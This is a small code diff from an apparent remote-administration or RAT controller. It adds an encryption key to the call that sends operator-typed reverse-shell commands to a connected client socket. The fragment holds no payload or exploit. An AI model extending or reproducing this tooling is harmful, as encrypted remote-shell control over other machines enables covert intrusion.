@@ -96,7 +96,7 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
         str1.append(1, '\r');
         str1.append(1, '\n');
 
-        p_Servidor->cChunkSend(this->sckCliente, str1.c_str(), str1.size(), 0, false, EnumComandos::Reverse_Shell_Command);
+        p_Servidor->cChunkSend(this->sckCliente, str1.c_str(), str1.size(), 0, false, EnumComandos::Reverse_Shell_Command, this->enc_key);
 
         this->p_uliUltimo = this->txtConsole->GetLastPosition() + 1;
         event.Skip();
